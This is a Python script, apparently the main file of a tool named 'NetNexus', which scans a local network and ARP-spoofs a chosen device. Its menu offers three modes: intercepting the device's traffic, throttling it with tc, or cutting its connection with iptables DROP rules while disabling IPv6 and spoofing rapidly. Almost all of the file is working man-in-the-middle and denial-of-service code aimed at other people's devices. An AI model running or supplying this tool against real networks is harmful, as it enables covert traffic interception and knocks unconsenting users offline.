import scapy.all as scapy
import os
import time
import sys
import subprocess
from core import scanner, spoof

def set_forwarding(state):
    """
    state=True: Intercept/Limit Mode (Forwarding ON)
    state=False: Kill Mode (Forwarding OFF + IPTables BLOCK + IPv6 DISABLE)
    """
    if state:
        # Enable IPv4 Forwarding
        subprocess.run(["sudo", "sysctl", "-w", "net.ipv4.ip_forward=1"], capture_output=True)
        # Re-enable IPv6 (Default state)
        subprocess.run(["sudo", "sysctl", "-w", "net.ipv6.conf.all.disable_ipv6=0"], capture_output=True)
        # Flush all block rules
        subprocess.run(["sudo", "iptables", "-F"], capture_output=True)
        subprocess.run(["sudo", "iptables", "-P", "FORWARD", "ACCEPT"], capture_output=True)
    else:
        # HARD KILL: Disable IPv4 Forwarding
        subprocess.run(["sudo", "sysctl", "-w", "net.ipv4.ip_forward=0"], capture_output=True)
        # Block IPv6 to prevent the target from switching protocols
        subprocess.run(["sudo", "sysctl", "-w", "net.ipv6.conf.all.disable_ipv6=1"], capture_output=True)
        # Aggressive IPTables Drop
        subprocess.run(["sudo", "iptables", "-F"], capture_output=True)
        subprocess.run(["sudo", "iptables", "-A", "FORWARD", "-j", "DROP"], capture_output=True)
        subprocess.run(["sudo", "iptables", "-P", "FORWARD", "DROP"], capture_output=True)

def set_limit(interface, speed):
    """Uses Linux Traffic Control (tc) to slow down the connection."""
    subprocess.run(["sudo", "tc", "qdisc", "del", "dev", interface, "root"], capture_output=True)
    try:
        subprocess.run(["sudo", "tc", "qdisc", "add", "dev", interface, "root", "tbf", 
                        "rate", f"{speed}kbps", "latency", "50ms", "burst", "1540"], check=True)
        print(f"[*] Bandwidth limited to {speed}kbps")
    except Exception as e:
        print(f"[-] Limit Error: {e}")

def main():
    # Verify your interface name with 'ip a' (usually wlan0 or wlp2s0)
    iface = "wlan0" 
    scapy.conf.iface = iface
    
    if os.geteuid() != 0:
        print("[-] NetNexus requires root. Please use: sudo python main.py")
        return

    gateway_ip = "192.168.1.1" # Change this if your router IP is different
    ip_range = "192.168.1.1/24"
    device_memory = {} 

    while True:
        print("\n" + "="*45)
        print("      NetNexus: Ultimate Full Build")
        print("="*45)
        
        # Persistent scanning
        device_memory = scanner.scan(ip_range, device_memory)
        current_list = list(device_memory.values())
        
        for index, dev in enumerate(current_list):
            print(f"{index}\t{dev['ip']}\t\t{dev['name']}")
        
        print("-" * 45)
        print("[R] Refresh  [C] Exit")
        
        user_input = input("\nSelect ID: ").lower().strip()
        if user_input == 'c': sys.exit()
        if user_input == 'r': continue
        
        try:
            target = current_list[int(user_input)]
            target_ip, target_mac = target['ip'], target['mac']

            print(f"\nTarget: {target_ip} ({target['name']})")
            print("[1] Intercept (Normal) | [2] Limit (Lag) | [3] Kill (No Net)")
            mode = input("Select Action: ")

            print("[*] Resolving Gateway MAC...")
            gateway_mac, _ = spoof.get_device_info(gateway_ip)

            wait_time = 0.5
            if mode == "1":
                set_forwarding(True)
            elif mode == "2":
                kbps = input("Enter limit in kbps: ")
                set_forwarding(True)
                set_limit(iface, kbps)
            elif mode == "3":
                set_forwarding(False)
                wait_time = 0.05 # Fast spamming to beat the router's 'is-at' replies

            print(f"[*] Attack Active on {target_ip}. Ctrl+C to return to menu.")
            while True:
                spoof.spoof(target_ip, gateway_ip, target_mac, gateway_mac)
                time.sleep(wait_time) 
                
        except (ValueError, IndexError):
            print("[-] Invalid Selection.")
        except KeyboardInterrupt:
            print("\n[*] Stopping... Cleaning up system.")
            set_forwarding(True)
            subprocess.run(["sudo", "tc", "qdisc", "del", "dev", iface, "root"], capture_output=True)
            spoof.restore(target_ip, gateway_ip)
            spoof.restore(gateway_ip, target_ip)
            time.sleep(1)

if __name__ == "__main__":
    main()
